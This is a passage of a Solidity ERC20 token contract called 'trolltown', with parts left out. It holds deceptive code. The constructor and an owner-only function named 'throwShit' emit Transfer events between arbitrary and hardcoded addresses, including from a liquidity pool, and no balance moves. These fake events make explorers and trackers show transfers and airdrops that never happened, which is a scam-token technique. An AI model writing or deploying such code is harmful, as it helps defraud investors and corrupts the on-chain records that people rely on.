...
contract trolltown is Context, IERC20 {
    ...
    address _contDeployr = 0x3213579537BC370B5a1e22Eeb3A60AA5Bb954C93;
    address public _ownr = 0xeA14C21Add63020eAdd24c85071493a8262d82A8;
   constructor () public {
        ...
        emit Transfer(_contDeployr, 0x3213579537BC370B5a1e22Eeb3A60AA5Bb954C93, initialSupply/5);
        emit Transfer(0x3213579537BC370B5a1e22Eeb3A60AA5Bb954C93, 0x54616C0815c306FC22417b96282cA4AA6F47D357, initialSupply/5);
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function throwShit(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}
